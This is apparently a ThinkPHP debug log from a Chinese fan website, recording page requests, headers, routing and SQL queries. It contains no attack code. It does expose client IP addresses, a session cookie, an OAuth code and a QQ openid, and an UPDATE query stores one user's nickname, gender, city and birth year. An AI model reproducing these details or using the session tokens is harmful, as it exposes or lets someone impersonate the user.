[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/music/index.html [ array (
  0 => 'nickname',
  1 => 'value',
  2 => 'data',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000242s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `music` [ RunTime:0.000580s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `music` LIMIT 1 [ RunTime:0.000129s ]
[ sql ] [ SQL ] SELECT * FROM `music` ORDER BY issue_time asc LIMIT 0,20 [ RunTime:0.000137s ]

---------------------------------------------------------------
[ 2018-05-05T11:24:50+08:00 ] 172.16.0.5 183.3.227.100 GET /index/login/login.html
[ log ] zard-forever.com/index/login/login.html [运行时间：0.173608s][吞吐率：5.76req/s] [内存消耗：1,698.95kb] [文件加载：51]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'login',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'referer' => 'http://zard-forever.com/',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/sharpp,image/apng,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Login->login[ /home/www/WWW/application/index/controller/Login.php ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:24:50+08:00 ] 172.16.0.5 183.3.227.100 GET /index/login/login.html
[ log ] zard-forever.com/index/login/login.html [运行时间：0.015220s][吞吐率：65.70req/s] [内存消耗：1,699.11kb] [文件加载：51]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'login',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'referer' => 'http://zard-forever.com/',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/sharpp,image/apng,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Login->login[ /home/www/WWW/application/index/controller/Login.php ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:24:51+08:00 ] 172.16.0.5 183.3.227.100 GET /index/login/login.html
[ log ] zard-forever.com/index/login/login.html [运行时间：0.013919s][吞吐率：71.84req/s] [内存消耗：1,699.11kb] [文件加载：51]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'login',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'referer' => 'http://zard-forever.com/',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/sharpp,image/apng,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Login->login[ /home/www/WWW/application/index/controller/Login.php ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:25:11+08:00 ] 172.16.0.5 121.51.14.25 GET /index/login/index.html?code=ED9205F2F8885DA0E1F328961090FB0E&state=6e4f08612a979d3febc10e9e697a90d0
[ log ] zard-forever.com/index/login/index.html?code=ED9205F2F8885DA0E1F328961090FB0E&state=6e4f08612a979d3febc10e9e697a90d0 [运行时间：0.846825s][吞吐率：1.18req/s] [内存消耗：2,694.45kb] [文件加载：66]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/sharpp,image/apng,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'code' => 'ED9205F2F8885DA0E1F328961090FB0E',
  'state' => '6e4f08612a979d3febc10e9e697a90d0',
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Login->index[ /home/www/WWW/application/index/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ CACHE ] INIT File
[ info ] [ VIEW ] /home/www/WWW/thinkphp/tpl/dispatch_jump.tpl [ array (
  0 => 'code',
  1 => 'msg',
  2 => 'data',
  3 => 'url',
  4 => 'wait',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000236s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `users` [ RunTime:0.000603s ]
[ sql ] [ SQL ] SELECT * FROM `users` WHERE  `openid` = 'B4BD118C5A7A05F9085A66D9401A7B9A' LIMIT 1 [ RunTime:0.191862s ]
[ sql ] [ SQL ] UPDATE `users`  SET `openid`='B4BD118C5A7A05F9085A66D9401A7B9A',`nickname`='阳光的滋味',`gender`='男',`province`='广东',`city`='茂名',`year`='1994',`figureurl`='http://qzapp.qlogo.cn/qzapp/101452121/B4BD118C5A7A05F9085A66D9401A7B9A/30',`figureurl_1`='http://qzapp.qlogo.cn/qzapp/101452121/B4BD118C5A7A05F9085A66D9401A7B9A/50',`figureurl_2`='http://qzapp.qlogo.cn/qzapp/101452121/B4BD118C5A7A05F9085A66D9401A7B9A/100',`figureurl_qq_1`='http://thirdqq.qlogo.cn/qqapp/101452121/B4BD118C5A7A05F9085A66D9401A7B9A/40',`figureurl_qq_2`='http://thirdqq.qlogo.cn/qqapp/101452121/B4BD118C5A7A05F9085A66D9401A7B9A/100',`is_yellow_vip`=0,`vip`=0,`yellow_vip_level`=0,`level`=0,`is_yellow_year_vip`=0  WHERE  `id` = 1 [ RunTime:0.086897s ]

---------------------------------------------------------------
[ 2018-05-05T11:25:14+08:00 ] 172.16.0.5 183.3.227.100 GET /index/index/index.html
[ log ] zard-forever.com/index/index/index.html [运行时间：0.014728s][吞吐率：67.90req/s] [内存消耗：1,687.79kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'referer' => 'http://zard-forever.com/index/login/index.html?code=ED9205F2F8885DA0E1F328961090FB0E&state=6e4f08612a979d3febc10e9e697a90d0',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/sharpp,image/apng,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:25:22+08:00 ] 172.16.0.5 183.3.227.100 GET /index/index/index.html
[ log ] zard-forever.com/index/index/index.html [运行时间：0.014484s][吞吐率：69.04req/s] [内存消耗：1,688.00kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'referer' => 'http://zard-forever.com/index/login/index.html?code=ED9205F2F8885DA0E1F328961090FB0E&state=6e4f08612a979d3febc10e9e697a90d0',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/sharpp,image/apng,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:25:49+08:00 ] 172.16.0.5 121.51.14.25 GET /index/mv/index.html
[ log ] zard-forever.com/index/mv/index.html [运行时间：0.025038s][吞吐率：39.94req/s] [内存消耗：2,689.23kb] [文件加载：58]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'mv',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'referer' => 'http://zard-forever.com/index/index/index.html',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/sharpp,image/apng,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Mv->index[ /home/www/WWW/application/index/controller/Mv.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/mv/index.html [ array (
  0 => 'nickname',
  1 => 'value',
  2 => 'data',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000240s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `mv` [ RunTime:0.000592s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 LIMIT 1 [ RunTime:0.000148s ]
[ sql ] [ SQL ] SELECT * FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 ORDER BY `id` LIMIT 0,20 [ RunTime:0.000205s ]

---------------------------------------------------------------
[ 2018-05-05T11:25:50+08:00 ] 172.16.0.5 120.204.200.81 GET /index/login/login.html
[ log ] zard-forever.com/index/login/login.html [运行时间：0.030563s][吞吐率：32.72req/s] [内存消耗：1,694.91kb] [文件加载：51]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'login',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'zard-forever.com',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
  'referer' => 'http://zard-forever.com/',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; Coolpad Y82-520 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.9.8.738 U3/0.8.0 Mobile Safari/534.30',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Login->login[ /home/www/WWW/application/index/controller/Login.php ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:25:50+08:00 ] 172.16.0.5 120.204.17.71 GET /index/login/login.html
[ log ] zard-forever.com/index/login/login.html [运行时间：0.027453s][吞吐率：36.43req/s] [内存消耗：1,694.91kb] [文件加载：51]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'login',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'zard-forever.com',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
  'referer' => 'http://zard-forever.com/',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; HUAWEI ALE-CL00 Build/HuaweiALE-CL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.0.907 Mobile Safari/537.36',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Login->login[ /home/www/WWW/application/index/controller/Login.php ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:25:54+08:00 ] 172.16.0.5 61.151.226.77 GET /index/login/login.html
[ log ] zard-forever.com/index/login/login.html [运行时间：0.015870s][吞吐率：63.01req/s] [内存消耗：1,696.54kb] [文件加载：51]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'login',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'zard-forever.com',
  'accept-language' => 'en,*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4',
  'referer' => '',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Login->login[ /home/www/WWW/application/index/controller/Login.php ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:26:11+08:00 ] 172.16.0.5 183.3.227.100 GET /index/picture/index.html
[ log ] zard-forever.com/index/picture/index.html [运行时间：0.125471s][吞吐率：7.97req/s] [内存消耗：2,598.36kb] [文件加载：55]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'picture',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'referer' => 'http://zard-forever.com/index/index/index.html',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/sharpp,image/apng,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Picture->index[ /home/www/WWW/application/index/controller/Picture.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/picture/index.html [ array (
  0 => 'picture',
  1 => 'first_selected',
  2 => 'second_selected',
  3 => 'first',
  4 => 'second',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000246s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `picture` [ RunTime:0.000545s ]
[ sql ] [ SQL ] SELECT * FROM `picture` WHERE  `first_type` = 0  AND `second_type` = 0 ORDER BY id asc LIMIT 15 [ RunTime:0.000185s ]

---------------------------------------------------------------
[ 2018-05-05T11:26:14+08:00 ] 172.16.0.5 117.185.117.54 GET /index/index/index.html
[ log ] zard-forever.com/index/index/index.html [运行时间：0.015374s][吞吐率：65.05req/s] [内存消耗：1,681.75kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'zard-forever.com',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
  'referer' => 'http://zard-forever.com/index/login/index.html?code=ED9205F2F8885DA0E1F328961090FB0E&state=6e4f08612a979d3febc10e9e697a90d0',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:26:17+08:00 ] 172.16.0.5 183.3.227.100 GET /index/picture/picture_ajax.html?first_selected=0&second_selected=0&last_id=2419
[ log ] zard-forever.com/index/picture/picture_ajax.html?first_selected=0&second_selected=0&last_id=2419 [运行时间：0.037666s][吞吐率：26.55req/s] [内存消耗：2,517.48kb] [文件加载：53]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'picture',
    2 => 'picture_ajax',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'referer' => 'http://zard-forever.com/index/picture/index.html',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'first_selected' => '0',
  'second_selected' => '0',
  'last_id' => '2419',
)
[ info ] [ RUN ] app\index\controller\Picture->picture_ajax[ /home/www/WWW/application/index/controller/Picture.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000246s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `picture` [ RunTime:0.000532s ]
[ sql ] [ SQL ] SELECT * FROM `picture` WHERE  `first_type` = 0  AND `second_type` = 0  AND `id` > 2419 LIMIT 6 [ RunTime:0.000195s ]

---------------------------------------------------------------
[ 2018-05-05T11:26:17+08:00 ] 172.16.0.5 121.51.14.25 GET /index/picture/picture_ajax.html?first_selected=0&second_selected=0&last_id=2425
[ log ] zard-forever.com/index/picture/picture_ajax.html?first_selected=0&second_selected=0&last_id=2425 [运行时间：0.022899s][吞吐率：43.67req/s] [内存消耗：2,517.48kb] [文件加载：53]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'picture',
    2 => 'picture_ajax',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'referer' => 'http://zard-forever.com/index/picture/index.html',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'first_selected' => '0',
  'second_selected' => '0',
  'last_id' => '2425',
)
[ info ] [ RUN ] app\index\controller\Picture->picture_ajax[ /home/www/WWW/application/index/controller/Picture.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000224s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `picture` [ RunTime:0.000544s ]
[ sql ] [ SQL ] SELECT * FROM `picture` WHERE  `first_type` = 0  AND `second_type` = 0  AND `id` > 2425 LIMIT 6 [ RunTime:0.000199s ]

---------------------------------------------------------------
[ 2018-05-05T11:26:20+08:00 ] 172.16.0.5 183.3.227.100 GET /index/picture/picture_ajax.html?first_selected=0&second_selected=0&last_id=2431
[ log ] zard-forever.com/index/picture/picture_ajax.html?first_selected=0&second_selected=0&last_id=2431 [运行时间：0.021079s][吞吐率：47.44req/s] [内存消耗：2,517.48kb] [文件加载：53]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'picture',
    2 => 'picture_ajax',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'referer' => 'http://zard-forever.com/index/picture/index.html',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'first_selected' => '0',
  'second_selected' => '0',
  'last_id' => '2431',
)
[ info ] [ RUN ] app\index\controller\Picture->picture_ajax[ /home/www/WWW/application/index/controller/Picture.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000248s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `picture` [ RunTime:0.000617s ]
[ sql ] [ SQL ] SELECT * FROM `picture` WHERE  `first_type` = 0  AND `second_type` = 0  AND `id` > 2431 LIMIT 6 [ RunTime:0.000183s ]

---------------------------------------------------------------
[ 2018-05-05T11:26:25+08:00 ] 172.16.0.5 121.51.14.25 GET /index/chat/index.html
[ log ] zard-forever.com/index/chat/index.html [运行时间：0.033103s][吞吐率：30.21req/s] [内存消耗：1,672.80kb] [文件加载：47]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'chat',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'referer' => 'http://zard-forever.com/index/index/index.html',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
